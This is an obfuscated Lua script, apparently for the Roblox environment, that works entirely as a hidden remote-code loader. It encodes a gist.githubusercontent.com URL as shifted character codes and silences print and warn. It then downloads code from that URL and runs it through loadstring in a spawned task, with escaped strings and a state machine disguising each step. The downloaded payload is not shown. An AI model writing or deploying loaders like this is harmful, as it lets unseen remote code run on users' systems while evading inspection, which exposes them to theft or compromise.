local _1 = string; local _2 = table; local _3 = game;
local _4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}

local _O = {
    ["\103\101\116"] = function(s, u) return s:HttpGet(u, true) end,
    ["\101\120\101"] = loadstring,
    ["\100\101\102"] = function(d)
        local r = {}
        for i = 1, #d do
            r[i] = _1.char(d[i] - 12)
        end
        return _2.concat(r)
    end
}

local function _S()
    local _state = 1
    local _res = nil
    
    while _state ~= 0 do
        if _state == 1 then
            -- Ortam Kontrolü ve Başlatma
            local p, w = print, warn;
            print, warn = function() end, function() end;
            _state = 2
        elseif _state == 2 then
            -- Linki Çöz ve Veriyi Çek
            local u = _O["\100\101\102"](_4) .. "?v=" .. math.random(1000, 9999)
            local s, c = pcall(_O["\103\101\116"], _3, u)
            
            if s and c and #c > 0 then
                _res = c
                _state = 3
            else
                _state = 0
            end
        elseif _state == 3 then
            -- Kodun Yüklenmesi
            local f = _O["\101\120\101"](_res)
            if f then 
                task.spawn(f) 
            end
            _state = 0
        end
    end
end

_S()
